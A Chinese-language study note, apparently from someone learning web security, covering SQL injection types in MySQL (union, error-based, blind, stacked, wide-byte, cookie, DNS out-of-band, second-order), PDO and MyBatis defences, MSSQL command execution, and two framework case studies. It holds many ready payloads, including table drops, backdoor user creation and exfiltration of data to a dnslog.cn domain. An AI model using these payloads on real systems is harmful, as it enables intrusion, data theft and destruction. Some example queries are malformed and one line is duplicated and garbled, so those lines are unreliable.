# SQL注入

### 关键库 `Information_schema`

MySQL自带,提供了访问数据库元数据的方式,MySQL中把其看作信息数据库,保存着关于维护数据库服务器的信息,如数据库名,表名,字段.其本身只读

- Schemata表
  - 存储MySQL服务下所有**数据库的库名**,这里需要记住schema_name字段,记录了所有数据库的库名
- tables表
  - 存储MySQL服务下**数据库的库名和表名**,这里要记住Table_schema和table_name两个字段
- columns表,存储MySQL服务下所有**数据库的库名,表名,字段名**,这要记住:Table_schema,Table_name,column_name



## SQL注入原理

**一句话核心:**应用程序将用户输入拼接到了SQL查询的语句中,导致用户构造的恶意payload被带入到数据库中执行,造成信息泄露等危害.

### 漏洞原理

SQL注入指的是Web对用户输入的合法性未进行判断,处理.前端传入的参数是攻击者可控的,并且参数被正常带入到数据库中执行,攻击者可以通过构造不同的SQL语句来对数据库进行操作,正常情况下,攻击者可以对数据库进行,数据查询,webshell写入,命令执行等

### 出现场景

任何  外部输入--拼接SQL--数据库执行  的链路,都可能存在注入.高发位置:

| POST表单 |   登录框.搜索框,注册信息   |
| :------: | :------------------------: |
| URL参数  |       ?id=1,?page=2        |
|  HTTP头  | User-Agent,X-Forwarded-For |
|  Cookie  |    从Cookie读取用户标识    |
| JSON/XML |       API接口请求体        |

### 产生条件

1. 参数用户可控,前端传入后端的内容是用户可以控制的
2. 参数被带入数据库执行,也就是传入的参数被拼接到SQL语句中,带入到数据库中执行



## 一般的注入流程思路

> [!TIP]
>
> 1. 判断是否存在注入,注入是字符型还是数字型
>    - '  ,  and 1=1 , and 1=2 , and sleep(5)等
>    - ?id=1  and '1'='1 = True 页面正常
>    - ?id=1  and 1=2 --+- Flase 页面异常
> 2. 猜解出SQL查询语句中的字段数,或者直接查看查询结果判断
>    - order by N
>    - ?id=1 order by 4--+-True 页面正常
>    - ?id=1 order by 5--+-Flase 页面异常
> 3. 判断字段在页面的回显位置
>    - ?id=1 union select 1,2,3,4,5--+-
> 4. 查询数据库名
>    - ?id=1 select 1,2,3,database()--+-
> 5. 查询数据表
>    - ?id=1 select table_name,from infomation_schema.tables,where table_schema = databases()--+-
> 6. 查字段名
>    - ?id=1 union select column_name,from information_schema.columns where table_name = 'users' --+-
> 7. 查询字段值
>    - select username,passwd,from users --+-



## 常见的利用函数

1. union()联合查询

   - ```sql
     SELECT 1,2,3 UNION SELECT 1,DATABASE(),3; #union两侧字段数量必须一致
     ```

2. sleep()延时,输出结果

   - ```sql
     SELECT sleep(4);#延时4秒
     ```

3. length() 返回字段结果长度

   - ```sql
     SELECT length(user());#返回user字段的长度
     ```

4. count() 聚合函数,返回查询对象总数

   - ```sql
     SELECT COUNT (*) FROM users;#返回users中的*(匹配所有)的总数
     ```

5. concat() 拼接字符串,将一个或者多个字符串拼接到一个字符串

   - ```sql
     concat (0x7e,database(),0x7e);#0x7e 为分隔符~
     ```

6. group_concat() 使用分隔符将一个或者多个字符串连接到一个字符串,是concat 的特殊形式,第一个参数是其他参数的分隔符.分隔符的位置在连接的两个字符的中间,分隔符可以是字符串,也可以是其他参数.**特点是不会合并多行,多少条数据就输出多少行**

   - ```sql
     SELECT group_concat(0x7e,database(),0x7e) from users;
     ```

7. substr() 截取字符串的一部分

   - ```sql
     SELECT substr(user(),1,1)#从1开始截取1个	
     ```

8. mid()截取字符串,不支持from for 若waf拦截substr可用mid替代

9. ascii()/ord() 将某个字符串转化为ascii值

   - ```sql
     SELECT ascii(mid(user(),1,1)); #从1索引位置截取当前数据库用户名的1个字符转化为ascii码
     ```

10. hex() 对数据进行16进制 编码

    - ```sql
      SELECT hex(concat(user(),))
      ```

11. if(A,B,C) 条件判断,如果A成立执行B,否则C

    - ```sql
      SELECT if(length(database())=5,sleep(50),1) #如果数据库名字长度为5,就延时50s
      ```

12. limit 限制查询数量

    - ```sql
      SELECT * FROM users limit 0,1 #检索从0行开始的一行记录 *匹配所有
      ```

      

## SQL注入攻击类型

### 一.UNION联合查询注入

**原理**：利用UNION操作符合并查询结果，要求**列数相同、数据类型兼容**。两个查询结构有相同 的列数,因此要对字段数判断,且页面有数据回显点

#### 攻击步骤:

1. 发现注入点. 输入'或and 1=2 
2. 判断类型.字符型闭合引号,数字型不用  ' or '1'='1 或 or 1=1
3. order by 判断列数,递增N直到报错
4. union select 定位回显位置 id=0 union select 1,2,3,4 看会显示那些数字
5. 开始查询 union select 1,group_concat (schema_name),3,4 from infomation_schema.schemata 一点一点拖

**必须依赖information_schema**;需要列数匹配回显位有限



### 二.报错注入

#### **原理:**

页面会返回报错信息,我们可以将输出的查询到结果带到报错信息中,在报错中查看回显.可用函数,updatexml(),extractvalue(),floor();MysQL需要开启`subquery_error`才能返回报错信息,利用 **XPATH语法错误/聚合函数分组冲突**

#### **经典手法(MySQL):**

```sql
SELECT EXP(~(SELECT * FROM (SELECT version())x));	#exp()溢出报错,(~0为最大无符号的 BIGINT类型)

AND extractvalue(1,concat(0x7e,database()))
```



#### `UPDATEXML()` 利用

**函数原生作用**: 

```sql
UPDATEXML(xml_doc,xpath_expr,new_val)#加载XML文件
```

第二个参数xpath要求是合法的XPATH表达式,我们构造非法XPATH语法,MySQL会把传入的内容原样打印在错误提示里.

**基础的payload模板** 

```sql
and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

使用0x7e拼接目标数据,~在XPATH语法中非法,即会报错

限制是32字符,实战中可利用substr分段截取*

```sql
and updatexml(1,concat(0x7e,substr((select password from admin limit 0,1),1,30),0x7e),1)

and updatexml(1,concat(0x7e,substr((select password from admin limit 0,1),31,30),0x7e),1)
```



#### `extractvalue()`利用

**原生函数作用:**

```sql
EXTRACTVALUE(xml_doc,xpath_expr)#只接收两个参数,同样要求第二个参数XPATH合法	
```

**基础的payload模板** 

```sql
and extractvalue(1,concat(0x7e,(select databases()),0x7e))
```

可替换updatexml



#### `floor()`利用

**原生函数作用:**

```sql
floor(x) #向下取整函数,返回不大于X的最大整数
```

```sql
rand() #无参数时返回[0,1)之间的随机小鼠
```

> [!NOTE]
>
> **报错根源为在 group by分组时,会分别在检索这个主键,和插入的时候执行两次rand(),而两次的数值可能不同,导致主键冲突报错**

**完整版payload**:

```sql
select count(*),concat(0x7e,(select database()),0x7e,floor(rand()*2)) as tmp from information_schema.tables group by tmp; 
```



### 三.布尔盲注

#### **原理:**

在SQL注入过程中,SQL语句执行查询后,查询数据不能回显到前端,业务报错时我们需要使用特殊方法尝试,需要 **根据页面响应的差距逐字符推断数据**,示例:

```sql
?id =1 AND (SELECT SUBSTRING(password,1,1)FROM users LIMIT 1) = 'a'
```

截取第一个字符如果是a的话页面正常

```sql
SELECT if(ascii(substr(database(),1,1))=115,sleep(50),1)
```

使用if判断ascii码



### 四.时间盲注

#### **原理:**

#### 无页面差异的时候,用`sleep()`或`benchmark()`实现延迟,通过响应时间判断条件真假

**标准payload模板**:

```sql
if(ascii(substr(database(),1,1))=114,sleep(5),1)
?id=1 and if(ascii(substr(database(),1,1))=114,sleep(5),1)
```

条件成立,数据库线程卡住 5s之后返回,不成立,立刻返回

当sleep被过滤的时候可替换为 `benchmark()`

**原理:**循环重复执行指定函数,消耗CPU资源,认为制造运算耗时

```sql
benchmark (500000,md5('abcsfsdfas')) 
```

MySQL循环50万次md5加密字符串,cpu持续运算,产生延迟

**标准payload模板**:

```sql
if(ascii(substr(database(),1,1))=114,benchmark(500000,md5('test')),1)
?id=1 and if(ascii(substr(database(),1,1))>100,benchmark(800000,sha1('x')),1)
```

- 延迟时间不固定,受服务器CPU性能影响极大
- 只能接受函数,不能写任意SQL语句,其内部只能放函数(md5/sha/rand等)
- 高循环次数极易触发监控报警

### 五.堆叠注入

#### **原理**:

用 ; 分割多条SQL语句,依次执行,可直接同时执行多条独立的SQL语句,能直接 `drop table`,`insert` 后门用户

```sql
select * from users where id=1;drop table admin;
```

> [!NOTE]
>
> *能否利用堆叠注入由后端代码的数据库API决定,第二条SQL的执行结果无法返回页面*

**常用payload**

```sql
?id=1;DROP TABLE admin;

?id=1;CREATE USER hacker identified by '123456';

?id=1;UPDATE admin SET PASSWORD=md5(123456) where id=1;
```

**无法返回页面的常用解决方法**

- 查询结果写入文件 `outfile` `dumpfile`;需要 `secure_file_priv`为空

```sql
?id=1;select group_concat(table_name) into outfile '/tmp/tables.txt' from information_schema.tables where table_schema=database();
```

- 配合延时盲注,报错注入,若无文件权限的 话

```sql
?id=1;select if(ascii(substr(database(),1,1))>100,sleep(5),1);
```



### 六.宽字节注入

#### **原理**:

GBK是双字节编码,两个字节代表一个汉字,输入精心构造的 `%df'`后,后端代码会对'单引号进行转移变为 `\'` ,此时的url解码后会变为 `%df %5c %27` ,其中的 `%df%5c`会被解析为汉字運.导致单引号逃逸.

**产生条件**:

- 后端PHP代码使用 `addslashes()` / `mysql_real_escape_string()` 进行转义单引号'
- MySQL数据库GBK编码
- 后端语言使用UTF-8编码

**闭合**:`?id=%df'`



### 七.Cookie注入

#### **原理:**

Cookie注入与,GET,POST区别不大,只是传递方式不同,一般WAF默认不会对Cookie进行检测,经常出现Cookie可以注入,但是GET/POST被拦截

**一般注入点:**

```php
$uid = $_COOKIE['uid'];
$sql = "select * from user where id = $uid";
mysql_query($sql);
```

- 服务端代码直接获取cookie变量,未做过滤转义或者预编译
- 很多防护设备waf默认不解析Cookie



### 八.DNSlog外带注入

#### **原理:**

在 `load_file()` 函数未被禁用的情况下,我们可以结合一些dnslog平台进行外带注入;DNS在解析的时候会留下日志,读取多级域名的解析日志获取信息.把要读取的信息放在域名中,传递到DNS服务上,读取日志获取信息

**条件:**

- `SHOW VARIABLES LIKE '%secure%'`  查看 `load_file()` 可以读取的磁盘
- 当 `secure_file_priv=""` 就可以读取磁盘目录
- 当 `secure_file_priv="G:\"` 就可以读取G磁盘目录
- 当 `secure_file_priv="null"` `load_file()`就不能加载文件

**常用Payload:**

```sql
select load_file(concat('\\\\',database(),'.xxx.dnslog.cn\\abc'));xxxxxxxxxx select load_file(concat('\\\\',database(),'.xxx.dnslog.cn\\abc'));?
```

> [!IMPORTANT]
>
> 重点为payload 中的 `\\\\`,在MySQL中`\`为转义符,SQL 内 `\\` 代表一个 `\`
>
> `\\\\` 传到系统识别为 `\\`
>
> Windows UNC 路径格式 `\\域名\路径`
>
> `load_file` 识别 UNC 网络路径时，会主动解析域名 DNS

**执行的流程拆解:**

```sql
concat('\\\\',database(),'.test.dnslog.cn\\a')
```

拼接结果: \\security.test.dnslog.cn\a 

MySQL 尝试访问 UNC 路径，操作系统对 `security.test.dnslog.cn` 进行 DNS 解析，域名携带数据



### 九.二次注入

#### **原理:**

已存储到数据库中的恶意数据,被用户读取后再次拼接到SQL查询语句中执行导致注入

**类型:**

- 写入一个用户名`admin'#`进数据库中

代码逻辑如下:

```php
$name = addslashes($_POST['username']);
$sql = "INSERT INTO user(username) VALUES('$name')";
```

- 自动转义单引号为 `\'`,当数据存入数据库后,MySQL会自动消除转义反斜杠
- 当修改自身密码时,会拼接语句

```sql
UPDATE user SET password='123456' WHERE username='admin'#'
```

- #后的内容被注释掉,等价于修改admin管理员的账号密码



**类型二**:

注册昵称时,填写载荷为, a' or '1'='1

当执行搜索时:

```sql
SELECT * FROM users WHERE nickname='$nickname';
```

结果:

```sql
SELECT * FROM users WHERE nickname='a' OR '1'='1';
```

则会爆出所有用户的账号和密码



**类型三**:

直接把攻击载荷提前写入数据库,如

```
x' and updatexml(1,concat(0x7e,database(),0x7e),1)#
```

注册为昵称

后续触发拼接后,可直接爆出数据库名称



## SQL注入防御



### 防御的方法:

- 函数过滤，如!is_numeric 函数
- 直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 360、阿里云、腾迅提供的防注入脚本
- 使用白名单过滤
- 采用 PDO 预处理
- 使用 Waf 拦截

### PDO预编译

什么是PDO:

PDO预处理可以防止SQL注入攻击： prepare 预处理语句可以有效地防止 SQL注入攻击，因为它会将 SQL 查询字符串与参数分开处理,确保参数,不会被解释为SQL代码的一部分。这有助于保护数据库免受恶意用户的攻击。  PDO（PHP Data Objects）的预编译不仅在PHP中，在Java、Python 等语言中都是防御SQL注入的最好方式

#### PDO的底层原理

PDO 预编译的核心思想可以用四个字概括：**代码与数据分离**。

1. **prepare (发送语法模板)**

PHP 代码先向数据库发送一个带有占位符或 的 SQL 模板，例如：

```sql
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
```

此时，没有任何用户数据参与。数据库引擎接收到这个模板后，会对其进行词法分析、语法解析，并预先生成好查询的执行计划（AST 语法树）。此时，SQL 语句的结构、逻辑已经被彻底“锁死”了。

2. **执行阶段execute()**绑定参数

将用户的输入数据当作纯数据传递给MySQL,填充占$stmt->execute([$username, $password]);位符

```php
$stmt->execute([$username, $password]);
```

> [!IMPORTANT]
>
> 1. 外部输入仅作为参数值传入,不会参与SQL语法解析
> 2. MysQL把参数单纯视作字符串/数值数据,永远不会被当作SQL指令

#### 什么时候无法使用PDO

预编译中的占位符,**必须只能用来替代值**,不能替代SQL的标识符,如表名和列名或语法关键字

1. 动态表名
2. 动态列名
3. ORDER　BY排序逻辑

列表往往需要点击表头进行排序，字段名往往是动态排序的

　４.IN　子句中的动态数组

#### 无法预编译时的防御方案

1. **严格的白名单校验**对于表名，列明绝对不信任用户的直接输入
2. **强制类型转换**，如果拼接的是数字类型，或者在无法预编译的老旧框架中，直接在拼接前做强转
3. **使用反引号包裹标识符**

在拼接列名或者表名时，加上反引号，但前提依然是要做字符清洗，防止反引号闭合逃逸



## Ｍssql



### 什么是系统存储过程

- 存储过程

每天都要执行一段很长很复杂的SQL语句的话,可以给这段代码起个名字打包在数据库中,每天直接调用这个名字就能执行就叫存储过程

- 系统存储过程

前面带 sp_前缀的,通常是微软自带的,方便数据库管理员管理服务器,预先写好了很多强大的存储过程,放在 `master`库中供人调用,比如修改配置的 `sp_configure` ,查看密码的 `sp_help` 

#### 他跟 `xp_cmdshell` 和 `sp_oacreate`的关系

这两个是为了让数据库拥有操作系统级别的能力而存在的扩展组件

1. **XP_cmdshel (扩展存储过程)**

   - xp_前缀代表扩展,它是用 C/C++ 写的动态链接库封装进SQL Server的。

   - 它相当于在数据库和Windows操作系统之间开了一扇后门.你可以直接通过SQL语句,向Windows的cmd.exe发送系统命令.`EXEC master..xp_cmdshell 'whoami'`

   - 因为太危险，微软从SQLServer2005开始就默认禁用了它.攻击者拿到sa权限后的第一件事就是尝试用 `sp_configure`重启他

2. **sp_oacreate(OLE自动化存储)**

   - 当管理员学聪明了，不仅禁用了 `xp_cmdshell` 甚至直接把它的 DLL 文件删掉时，攻击者就会寻找替代品，`sp_oacreate`就是最经典的替代品
   - 它允许SQL Server调用Windows的OLE对象.攻击者可以通过它实例化一个 `WScript.shell`对象,从而悄无声息地执行系统命令，或者使用 `Scripting.FileSystemObject`直接读写服务器硬盘的文件





## *JAVA框架中的SQL注入:MyBatis



### 什么是MyBatis XML配置

java中为面向对象编程,一般会写成 userMapper类下的,findByName方法

```java
userMapper.findByName("admin")
```

不会在java里写一堆SQL语句

于是便有了**MyBatis XML配置文件**,通常以`Mapper.xml`结尾,他规定了

- 拦截:当JAVA代码寻找findByName方法时
- 翻译:把xml文件里的 sql语句拿出来
- 装填:把java传来的参数塞进SQL语句中,然后提交数据库执行



### 核心问题 #{} 和 ${}

在MyBatis的XML映射文件中，程序员需要写SQL语句。当需要接收外部传进来的参数时,MyBatis给了两种语法：

1. **#{}**:当程序员写 `SELECT * FROM users WHERE username = #{name}` 时，MyBatis 底层会使用 Java 的 `PreparedStatement`。 **黑客视角：** 这就像把用户输入装进了一个绝对密封的“纯文本铁箱子”里。就算你输入了 `' OR 1=1 -- `，数据库也只会把它当成一个“名字叫这个长串的普通字符串”去查询，**绝对不会**把它当成 SQL 指令执行。这是安全的。

2. **${}**当程序员写 `SELECT * FROM users WHERE username = ${name}` 时，MyBatis 底层会直接进行**字符串替换（拼接）**。

> [!IMPORTANT]
>
> 在某些特定的 SQL 语法场景下，`#{}` 没法用，会报错误程序员为了赶进度，就会退而求其次，偷偷换成危险的 `${}`。



## 案例1：若依(RuoYi)框架历史高危SQL注入N-Day

若依作为国内使用量极其庞大的后台管理系统，它的历史版本中曾爆出过非常经典的 MyBatis SQL 注入漏洞。

- **漏洞位置：** 后台的“角色管理”或“部门管理”模块的**数据导出/分页排序**功能。

- **漏洞成因：** 若依的底层代码在处理前端传来的排序列（`orderByColumn`）时，没有经过严格的白名单校验，直接把参数丢进了 MyBatis XML 的 `${}` 中。

- **攻击方式：** 攻击者登录后台后，通过 Burp Suite 拦截正常的数据查询请求，在 `orderByColumn` 参数中插入报错注入或时间盲注 Payload。虽然有权限限制，但在攻防演练中，一旦拿到了普通员工账号，就能利用这个漏洞直接脱取系统管理员的 Hash 密码，进而扩大战果。

## 案例 2：某知名开源 CMS 系统 (如 JeeSite 早期版本)

- **漏洞成因：** 同样是搜索框的模糊查询和动态列排序。开发者图省事，写出了 `ORDER BY ${orderBy}`。

- **实战价值：** 这种 N-Day 漏洞由于是底层的写法问题，很多二开（二次开发）的外包公司在拿这些开源框架给甲方做系统时，根本不会去改底层的 XML，导致这些漏洞随着外包项目被无限复制到各大政企网站中。

